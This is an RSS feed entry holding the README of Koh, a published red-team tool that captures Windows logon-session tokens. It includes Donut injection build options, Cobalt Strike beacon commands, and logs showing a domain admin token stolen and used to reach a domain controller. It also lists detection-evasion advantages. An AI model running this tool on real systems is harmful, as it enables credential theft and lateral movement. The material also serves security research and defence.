<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-07-11T01:35:42Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>GhostPack/Koh</title>
    <updated>2022-07-11T01:35:42Z</updated>
    <id>tag:github.com,2022-07-11:/GhostPack/Koh</id>
    <link href="https://github.com/GhostPack/Koh" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The Token Stealer&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Koh&lt;/h1&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Koh is a C# and and Beacon Object File (BOF) toolset that allows for the capture of user credential material via purposeful token/logon session leakage.&lt;/p&gt; &#xA;&lt;p&gt;Some code was inspired by &lt;a href=&#34;https://twitter.com/elad_shamir&#34;&gt;Elad Shamir&lt;/a&gt;&#39;s &lt;a href=&#34;https://github.com/eladshamir/Internal-Monologue&#34;&gt;Internal-Monologue&lt;/a&gt; project (no license), as well as &lt;a href=&#34;https://mskb.pkisolutions.com/kb/180548&#34;&gt;KB180548&lt;/a&gt;. For why this is possible and Koh&#39;s approeach, see the &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#technical-background&#34;&gt;Technical Background&lt;/a&gt; section of this README.&lt;/p&gt; &#xA;&lt;p&gt;For a deeper explanation of the motivation behind Koh and its approach, see the &lt;a href=&#34;https://posts.specterops.io/koh-the-token-stealer-41ca07a40ed6&#34;&gt;Koh: The Token Stealer&lt;/a&gt; post.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt; is the primary author of this code base. &lt;a href=&#34;https://twitter.com/tifkin_&#34;&gt;@tifkin_&lt;/a&gt; helped with the approach, BOF implementation, and some token mechanics.&lt;/p&gt; &#xA;&lt;p&gt;Koh is licensed under the BSD 3-Clause license.&lt;/p&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#koh&#34;&gt;Koh&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#table-of-contents&#34;&gt;Table of Contents&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#koh-server&#34;&gt;Koh Server&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#compilation&#34;&gt;Compilation&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#usage&#34;&gt;Usage&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#example---listing-logon-sessions&#34;&gt;Example - Listing Logon Sessions&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#example---monitoring-for-logon-sessions-with-group-sid-filtering&#34;&gt;Example - Monitoring for Logon Sessions (with group SID filtering)&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#koh-client&#34;&gt;Koh Client&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#usage-1&#34;&gt;Usage&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#group-sid-filtering&#34;&gt;Group SID Filtering&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#example---capture&#34;&gt;Example - Capture&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#technical-background&#34;&gt;Technical Background&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#why-this-is-possible&#34;&gt;Why This Is Possible&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#approach&#34;&gt;Approach&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#possible-approaches&#34;&gt;Possible Approaches&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#our-approach&#34;&gt;Our Approach&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#advantages-disadvantages-versus-traditional-credential-extraction&#34;&gt;Advantages/Disadvantages Versus Traditional Credential Extraction&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#advantages&#34;&gt;Advantages&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#disadvantages&#34;&gt;Disadvantages&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#the-inline-shenanigans-bug&#34;&gt;The Inline Shenanigans Bug&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#iocs&#34;&gt;IOCs&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#todo&#34;&gt;TODO&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Koh Server&lt;/h2&gt; &#xA;&lt;p&gt;The Koh &#34;server&#34; captures tokens and uses named pipes for control/communication. This can be wrapped in &lt;a href=&#34;https://github.com/TheWover/donut/&#34;&gt;Donut&lt;/a&gt; and injected into any &lt;del&gt;high-integrity&lt;/del&gt; SYSTEM process (see &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#the-inline-shenanigans-bug&#34;&gt;The Inline Shenanigans Bug&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;h2&gt;Compilation&lt;/h2&gt; &#xA;&lt;p&gt;We are not planning on releasing binaries for Koh, so you will have to compile yourself :)&lt;/p&gt; &#xA;&lt;p&gt;Koh has been built against .NET 4.7.2 and is compatible with Visual Studio 2019 Community Edition. Simply open up the project .sln, choose &#34;Release&#34;, and build. The &lt;code&gt;Koh.exe&lt;/code&gt; assembly and &lt;code&gt;Koh.bin&lt;/code&gt; &lt;a href=&#34;https://github.com/TheWover/donut&#34;&gt;Donut-built&lt;/a&gt; PIC will be be output to the main directory. The Donut blob is both x86/x64 compatible, and is built with the following options using v0.9.3 of Donut at &lt;code&gt;./Misc/Donut.exe&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;  [ Instance type : Embedded&#xA;  [ Entropy       : Random names + Encryption&#xA;  [ Compressed    : Xpress Huffman&#xA;  [ File type     : .NET EXE&#xA;  [ Parameters    : capture&#xA;  [ Target CPU    : x86+amd64&#xA;  [ AMSI/WDLP     : abort&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Donut&#39;s license is BSD 3-clause.&lt;/p&gt; &#xA;&lt;h3&gt;Usage&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;Koh.exe Koh.exe &amp;lt;list | monitor | capture&amp;gt; [GroupSID... GroupSID2 ...]&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;list&lt;/strong&gt; - lists (non-network) logon sessions&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;monitor&lt;/strong&gt; - monitors for new/unique (non-network) logon sessions&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;capture&lt;/strong&gt; - captures one unique token per SID found for new (non-network) logon sessions&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Group SIDs can be supplied command line as well, causing Koh to monitor/capture only logon sessions that contain the specified group SIDs in their negotiated token information.&lt;/p&gt; &#xA;&lt;h3&gt;Example - Listing Logon Sessions&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;Koh.exe list&#xA;&#xA; __  ___   ______    __    __&#xA;|  |/  /  /  __  \  |  |  |  |&#xA;|  &#39;  /  |  |  |  | |  |__|  |&#xA;|    &amp;lt;   |  |  |  | |   __   |&#xA;|  .  \  |  `--&#39;  | |  |  |  |&#xA;|__|\__\  \______/  |__|  |__|&#xA;                     v1.0.0&#xA;&#xA;&#xA;  [*] Command: list&#xA;&#xA;  [*] Elevated to SYSTEM&#xA;&#xA;&#xA;  [*] New Logon Session - 6/22/2022 2:51:46 PM&#xA;      UserName    : THESHIRE\testuser&#xA;      LUID        : 207990196&#xA;      LogonType   : Interactive&#xA;      AuthPackage : Kerberos&#xA;      User SID    : S-1-5-21-937929760-3187473010-80948926-1119&#xA;      Origin LUID : 1677733 (0x1999a5)&#xA;&#xA;  [*] New Logon Session - 6/22/2022 2:51:46 PM&#xA;      UserName    : THESHIRE\DA&#xA;      LUID        : 81492692&#xA;      LogonType   : Interactive&#xA;      AuthPackage : Negotiate&#xA;      User SID    : S-1-5-21-937929760-3187473010-80948926-1145&#xA;      Origin LUID : 1677765 (0x1999c5)&#xA;&#xA;  [*] New Logon Session - 6/22/2022 2:51:46 PM&#xA;      UserName    : THESHIRE\DA&#xA;      LUID        : 81492608&#xA;      LogonType   : Interactive&#xA;      AuthPackage : Kerberos&#xA;      User SID    : S-1-5-21-937929760-3187473010-80948926-1145&#xA;      Origin LUID : 1677765 (0x1999c5)&#xA;&#xA;  [*] New Logon Session - 6/22/2022 2:51:46 PM&#xA;      UserName    : THESHIRE\harmj0y&#xA;      LUID        : 1677733&#xA;      LogonType   : Interactive&#xA;      AuthPackage : Kerberos&#xA;      User SID    : S-1-5-21-937929760-3187473010-80948926-1104&#xA;      Origin LUID : 999 (0x3e7)&#xA;    &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Example - Monitoring for Logon Sessions (with group SID filtering)&lt;/h3&gt; &#xA;&lt;p&gt;Only lists results that have the domain admins (-512) group SID in their token information:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;Koh.exe monitor S-1-5-21-937929760-3187473010-80948926-512&#xA;&#xA; __  ___   ______    __    __&#xA;|  |/  /  /  __  \  |  |  |  |&#xA;|  &#39;  /  |  |  |  | |  |__|  |&#xA;|    &amp;lt;   |  |  |  | |   __   |&#xA;|  .  \  |  `--&#39;  | |  |  |  |&#xA;|__|\__\  \______/  |__|  |__|&#xA;                     v1.0.0&#xA;&#xA;&#xA;  [*] Command: monitor&#xA;&#xA;  [*] Starting server with named pipe: imposecost&#xA;&#xA;  [*] Elevated to SYSTEM&#xA;&#xA;  [*] Targeting group SIDs:&#xA;      S-1-5-21-937929760-3187473010-80948926-512&#xA;&#xA;  [*] New Logon Session - 6/22/2022 2:52:17 PM&#xA;      UserName    : THESHIRE\DA&#xA;      LUID        : 81492692&#xA;      LogonType   : Interactive&#xA;      AuthPackage : Negotiate&#xA;      User SID    : S-1-5-21-937929760-3187473010-80948926-1145&#xA;      Origin LUID : 1677765 (0x1999c5)&#xA;&#xA;  [*] New Logon Session - 6/22/2022 2:52:17 PM&#xA;      UserName    : THESHIRE\DA&#xA;      LUID        : 81492608&#xA;      LogonType   : Interactive&#xA;      AuthPackage : Kerberos&#xA;      User SID    : S-1-5-21-937929760-3187473010-80948926-1145&#xA;      Origin LUID : 1677765 (0x1999c5)&#xA;&#xA;  [*] New Logon Session - 6/22/2022 2:52:17 PM&#xA;      UserName    : THESHIRE\harmj0y&#xA;      LUID        : 1677733&#xA;      LogonType   : Interactive&#xA;      AuthPackage : Kerberos&#xA;      User SID    : S-1-5-21-937929760-3187473010-80948926-1104&#xA;      Origin LUID : 999 (0x3e7)&#xA;  &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Koh Client&lt;/h2&gt; &#xA;&lt;p&gt;The current usable client is a Beacon Object File at &lt;code&gt;.\Clients\BOF\&lt;/code&gt;. Load the &lt;code&gt;.\Clients\BOF\KohClient.cna&lt;/code&gt; aggressor script in your Cobalt Strike client to enable BOF control of the Koh server. The only requirement for using captured tokens is &lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt;. The communication named pipe has an &#34;Everyone&#34; DACL but uses a basic shared password (super securez).&lt;/p&gt; &#xA;&lt;p&gt;To compile fresh on Linux using Mingw, see the &lt;code&gt;.\Clients\BOF\build.sh&lt;/code&gt; script. The only requirement (on Debian at least) should be &lt;code&gt;apt-get install gcc-mingw-w64&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Usage&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; help koh&#xA;koh list              - lists captured tokens&#xA;koh groups LUID       - lists the group SIDs for a captured token&#xA;koh filter list       - lists the group SIDs used for capture filtering&#xA;koh filter add SID    - adds a group SID for capture filtering&#xA;koh filter remove SID - removes a group SID from capture filtering&#xA;koh filter reset      - resets the SID group capture filter&#xA;koh impersonate LUID  - impersonates the captured token with the give LUID&#xA;koh release all       - releases all captured tokens&#xA;koh release LUID      - releases the captured token for the specified LUID&#xA;koh exit              - signals the Koh server to exit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Group SID Filtering&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;koh filter add S-1-5-21-&amp;lt;DOMAIN&amp;gt;-&amp;lt;RID&amp;gt;&lt;/code&gt; command will only capture tokens that contain the supplied group SID. This command can be run multiple times to add additional SIDs for capture. This can help prevent possible stability issues due to a large number of token leaks.&lt;/p&gt; &#xA;&lt;h3&gt;Example - Capture&lt;/h3&gt; &#xA;&lt;p&gt;&#34;Captures&#34; logon sessions by negotiating usable tokens for each new session.&lt;/p&gt; &#xA;&lt;p&gt;Server:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;Koh.exe capture&#xA;&#xA; __  ___   ______    __    __&#xA;|  |/  /  /  __  \  |  |  |  |&#xA;|  &#39;  /  |  |  |  | |  |__|  |&#xA;|    &amp;lt;   |  |  |  | |   __   |&#xA;|  .  \  |  `--&#39;  | |  |  |  |&#xA;|__|\__\  \______/  |__|  |__|&#xA;                     v1.0.0&#xA;&#xA;&#xA;  [*] Command: capture&#xA;&#xA;  [*] Starting server with named pipe: imposecost&#xA;&#xA;  [*] Elevated to SYSTEM&#xA;&#xA;&#xA;  [*] New Logon Session - 6/22/2022 2:53:01 PM&#xA;      UserName              : THESHIRE\testuser&#xA;      LUID                  : 207990196&#xA;      LogonType             : Interactive&#xA;      AuthPackage           : Kerberos&#xA;      User SID              : S-1-5-21-937929760-3187473010-80948926-1119&#xA;      Credential UserName   : testuser@THESHIRE.LOCAL&#xA;      Origin LUID           : 1677733 (0x1999a5)&#xA;&#xA;      [*] Successfully negotiated a token for LUID 207990196 (hToken: 848)&#xA;&#xA;&#xA;  [*] New Logon Session - 6/22/2022 2:53:01 PM&#xA;      UserName              : THESHIRE\DA&#xA;      LUID                  : 81492692&#xA;      LogonType             : Interactive&#xA;      AuthPackage           : Negotiate&#xA;      User SID              : S-1-5-21-937929760-3187473010-80948926-1145&#xA;      Credential UserName   : da@THESHIRE.LOCAL&#xA;      Origin LUID           : 1677765 (0x1999c5)&#xA;&#xA;      [*] Successfully negotiated a token for LUID 81492692 (hToken: 976)&#xA;&#xA;&#xA;  [*] New Logon Session - 6/22/2022 2:53:01 PM&#xA;      UserName              : THESHIRE\harmj0y&#xA;      LUID                  : 1677733&#xA;      LogonType             : Interactive&#xA;      AuthPackage           : Kerberos&#xA;      User SID              : S-1-5-21-937929760-3187473010-80948926-1104&#xA;      Credential UserName   : harmj0y@THESHIRE.LOCAL&#xA;      Origin LUID           : 999 (0x3e7)&#xA;&#xA;      [*] Successfully negotiated a token for LUID 1677733 (hToken: 980)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;BOF client:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; shell dir \\dc.theshire.local\C$&#xA;[*] Tasked beacon to run: dir \\dc.theshire.local\C$&#xA;[+] host called home, sent: 69 bytes&#xA;[+] received output:&#xA;Access is denied.&#xA;&#xA;beacon&amp;gt; getuid&#xA;[*] Tasked beacon to get userid&#xA;[+] host called home, sent: 20 bytes&#xA;[*] You are NT AUTHORITY\SYSTEM (admin)&#xA;&#xA;beacon&amp;gt; koh list&#xA;[+] host called home, sent: 6548 bytes&#xA;[+] received output:&#xA;[*] Using KohPipe                    : \\.\pipe\imposecost&#xA;&#xA;[+] received output:&#xA;&#xA;Username     : THESHIRE\localadmin (S-1-5-21-937929760-3187473010-80948926-1000)&#xA;LUID         : 67556826&#xA;CaptureTime  : 6/21/2022 1:24:42 PM&#xA;LogonType    : Interactive&#xA;AuthPackage  : Negotiate&#xA;CredUserName : localadmin@THESHIRE.LOCAL&#xA;Origin LUID  : 1676720&#xA;&#xA;Username     : THESHIRE\da (S-1-5-21-937929760-3187473010-80948926-1145)&#xA;LUID         : 67568439&#xA;CaptureTime  : 6/21/2022 1:24:50 PM&#xA;LogonType    : Interactive&#xA;AuthPackage  : Negotiate&#xA;CredUserName : da@THESHIRE.LOCAL&#xA;Origin LUID  : 1677765&#xA;&#xA;Username     : THESHIRE\harmj0y (S-1-5-21-937929760-3187473010-80948926-1104)&#xA;LUID         : 1677733&#xA;CaptureTime  : 6/21/2022 1:23:10 PM&#xA;LogonType    : Interactive&#xA;AuthPackage  : Kerberos&#xA;CredUserName : harmj0y@THESHIRE.LOCAL&#xA;Origin LUID  : 999&#xA;&#xA;beacon&amp;gt; koh groups 67568439&#xA;[+] host called home, sent: 6548 bytes&#xA;[+] received output:&#xA;[*] Using KohPipe                    : \\.\pipe\imposecost&#xA;&#xA;[+] received output:&#xA;S-1-5-21-937929760-3187473010-80948926-513&#xA;S-1-5-21-937929760-3187473010-80948926-512&#xA;S-1-5-21-937929760-3187473010-80948926-525&#xA;S-1-5-21-937929760-3187473010-80948926-572&#xA;&#xA;beacon&amp;gt; koh impersonate 67568439&#xA;[+] host called home, sent: 6548 bytes&#xA;[+] received output:&#xA;[*] Using KohPipe                    : \\.\pipe\imposecost&#xA;&#xA;[+] received output:&#xA;[*] Enabled SeImpersonatePrivilege&#xA;&#xA;[+] received output:&#xA;[*] Creating impersonation named pipe: \\.\pipe\imposingcost&#xA;&#xA;[+] received output:&#xA;[*] Impersonation succeeded. Duplicating token.&#xA;&#xA;[+] received output:&#xA;[*] Impersonated token successfully duplicated.&#xA;&#xA;[+] Impersonated THESHIRE\da&#xA;&#xA;beacon&amp;gt; getuid&#xA;[*] Tasked beacon to get userid&#xA;[+] host called home, sent: 20 bytes&#xA;[*] You are THESHIRE\DA (admin)&#xA;&#xA;beacon&amp;gt; shell dir \\dc.theshire.local\C$&#xA;[*] Tasked beacon to run: dir \\dc.theshire.local\C$&#xA;[+] host called home, sent: 69 bytes&#xA;[+] received output:&#xA; Volume in drive \\dc.theshire.local\C$ has no label.&#xA; Volume Serial Number is A4FF-7240&#xA;&#xA; Directory of \\dc.theshire.local\C$&#xA;&#xA;01/04/2021  11:43 AM    &amp;lt;DIR&amp;gt;          inetpub&#xA;05/30/2019  03:08 PM    &amp;lt;DIR&amp;gt;          PerfLogs&#xA;05/18/2022  01:27 PM    &amp;lt;DIR&amp;gt;          Program Files&#xA;04/15/2021  09:44 AM    &amp;lt;DIR&amp;gt;          Program Files (x86)&#xA;03/20/2020  12:28 PM    &amp;lt;DIR&amp;gt;          RBFG&#xA;10/20/2021  01:14 PM    &amp;lt;DIR&amp;gt;          Temp&#xA;05/23/2022  06:30 PM    &amp;lt;DIR&amp;gt;          tools&#xA;03/11/2022  04:10 PM    &amp;lt;DIR&amp;gt;          Users&#xA;06/21/2022  01:30 PM    &amp;lt;DIR&amp;gt;          Windows&#xA;               0 File(s)              0 bytes&#xA;               9 Dir(s)  40,504,201,216 bytes free&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Technical Background&lt;/h2&gt; &#xA;&lt;p&gt;When a new logon session is estabslished on a system, a new token for the logon session is created by LSASS using the NtCreateToken() API call and returned by to the caller of LsaLogonUser(). This &lt;a href=&#34;https://systemroot.gitee.io/pages/apiexplorer/d0/d9/rmlogon_8c-source.html#l00278&#34;&gt;increases the ReferenceCount&lt;/a&gt; field of the logon session kernel structure. When this ReferenceCount reaches 0, the logon session is destroyed. Because of the information described in the &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#why-this-is-possible&#34;&gt;Why This Is Possible&lt;/a&gt; section, Windows systems &lt;strong&gt;will NOT&lt;/strong&gt; release a logon session if a token handle still exists to it (and therefore the reference count != 0).&lt;/p&gt; &#xA;&lt;p&gt;So if we can get a handle to a newly created logon session via a token, we can keep that logon session open and later impersonate that token to utilize any cached credentials it contains.&lt;/p&gt; &#xA;&lt;h3&gt;Why This Is Possible&lt;/h3&gt; &#xA;&lt;p&gt;According &lt;a href=&#34;https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/using-debugging-tools-to-find-token-and-session-leaks/ba-p/400472&#34;&gt;to this post by a Microsoft engineer&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;After MS16-111, when security tokens are leaked, the logon sessions associated with those security tokens also remain on the system until all associated tokens are closed... even after the user has logged off the system. If the tokens associated with a given logon session are never released, then the system now also has a permanent logon session leak as well.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-111&#34;&gt;MS16-111&lt;/a&gt; was applied back to Windows 7/Server 2008, so this approach should be effective for everything except Server 2003 systems.&lt;/p&gt; &#xA;&lt;h2&gt;Approach&lt;/h2&gt; &#xA;&lt;p&gt;Enumerating logon sessions is easy (from an elevated context) through the use of the &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsaenumeratelogonsessions&#34;&gt;LsaEnumerateLogonSessions()&lt;/a&gt; Win32 API. What is more difficult is taking a specific logon session identifier (LUID) and &lt;em&gt;somehow&lt;/em&gt; getting a usable token linked to that session.&lt;/p&gt; &#xA;&lt;h3&gt;Possible Approaches&lt;/h3&gt; &#xA;&lt;p&gt;We brainstormed a few ways to a) hold open logon sessions and b) abuse this for token impersonation/use of cached credentials.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;The first approach was to use &lt;strong&gt;NtCreateToken()&lt;/strong&gt; which allows you to specify a logon session ID (LUID) to create a new token. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Unfortunately, you need &lt;strong&gt;SeCreateTokenPrivilege&lt;/strong&gt; which is traditionally only held by LSASS, meaning you need to steal LSASS&#39; token which isn&#39;t ideal.&lt;/li&gt; &#xA;   &lt;li&gt;One possibility was to add &lt;strong&gt;SeCreateTokenPrivilege&lt;/strong&gt; to NT AUTHORITY\SYSTEM via LSA policy modification, but this would need a reboot/new logon session to express the new user rights.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;You can also focus on just RemoteInteractive logon sessions by using &lt;strong&gt;WTSQueryUserToken()&lt;/strong&gt; to get tokens for new desktop sessions to clone. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;This is the approach apparently &lt;a href=&#34;https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/using-debugging-tools-to-find-token-and-session-leaks/ba-p/400472&#34;&gt;demonstrated by Ryan&lt;/a&gt;.&lt;/li&gt; &#xA;   &lt;li&gt;Unfortunately this misses newly created local sessions and incoming sessions created from things like PSEXEC.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;On a new logon session, open up a handle to every reachable process and enumerate all existing handles, cloning the token linked to the new logon session. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;This requires opening up lots of processes/handles, which looks very suspicious.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;The &lt;strong&gt;AcquireCredentialsHandle()&lt;/strong&gt;/&lt;strong&gt;InitializeSecurityContext()&lt;/strong&gt;/&lt;strong&gt;AcceptSecurityContext()&lt;/strong&gt; approach described below, which is what we went with.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Our Approach&lt;/h3&gt; &#xA;&lt;p&gt;The SSPI &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--negotiate&#34;&gt;AcquireCredentialsHandle()&lt;/a&gt; call has a &lt;strong&gt;pvLogonID&lt;/strong&gt; field which states:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;A pointer to a locally unique identifier (LUID) that identifies the user. This parameter is provided for file-system processes such as network redirectors. &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; In order to utilize a logon session LUID with &lt;strong&gt;AcquireCredentialsHandle()&lt;/strong&gt; you need &lt;strong&gt;SeTcbPrivilege&lt;/strong&gt;, however this is usually easier to get than &lt;strong&gt;SeCreateTokenPrivilege&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Using this call while specifying a logon session ID/LUID appears to increase the ReferenceCount for the logon session structure, preventing it from being released. However, we&#39;re not presented with another problem: given a &#34;leaked&#34;/held open logon session, how do we get a usable token from it? &lt;strong&gt;WTSQueryUserToken()&lt;/strong&gt; only works with desktop sessions, and there&#39;s no userland API that we could find that lets you map a LUID to a usable token.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;However&lt;/em&gt; we can use two additional SSPI functions, &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/secauthn/initializesecuritycontext--negotiate&#34;&gt;InitializeSecurityContext()&lt;/a&gt; and &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/secauthn/acceptsecuritycontext--negotiate&#34;&gt;AcceptSecurityContext()&lt;/a&gt; to act as client and server to ourselves, negotiating a new security context that we can then use with &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-querysecuritycontexttoken&#34;&gt;QuerySecurityContextToken()&lt;/a&gt; to get a usable token. This was documented in KB180548 (&lt;a href=&#34;https://mskb.pkisolutions.com/kb/180548&#34;&gt;mirrored by PKISolutions here&lt;/a&gt;) for the purposes of credential validation. This is a similar approach to &lt;a href=&#34;https://github.com/eladshamir/Internal-Monologue&#34;&gt;Internal-Monologue&lt;/a&gt;, except we are completing the entire handshake process, producing a token, and then holding that for later use.&lt;/p&gt; &#xA;&lt;p&gt;Filtering can then be done on the token itself, via &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership&#34;&gt;CheckTokenMembership()&lt;/a&gt; or &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation&#34;&gt;GetTokenInformation()&lt;/a&gt;. For example, we could release any tokens except for ones belonging to domain admins, or specific groups we want to target.&lt;/p&gt; &#xA;&lt;h3&gt;Advantages/Disadvantages Versus Traditional Credential Extraction&lt;/h3&gt; &#xA;&lt;h4&gt;Advantages&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Works for both local and inbound (non-network) logons.&lt;/li&gt; &#xA; &lt;li&gt;Works for inbound sessions created via Kerberos and NTLM.&lt;/li&gt; &#xA; &lt;li&gt;Doesn’t require opening up a handle to multiple processes.&lt;/li&gt; &#xA; &lt;li&gt;Doesn&#39;t create a new logon event or logon session.&lt;/li&gt; &#xA; &lt;li&gt;Doesn&#39;t create additional event logs on the DC outside of normal system ticket renewal behavior (I don&#39;t think?)&lt;/li&gt; &#xA; &lt;li&gt;No default lifetime on the tokens (I don&#39;t think?) so &lt;em&gt;access&lt;/em&gt; should work as long as the captured account’s credentials don&#39;t change and the system doesn’t reboot.&lt;/li&gt; &#xA; &lt;li&gt;Reuses legitimate captured auth on a system, so should &#34;blend with the noise&#34; reasonably well.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Disadvantages&lt;/h4&gt; 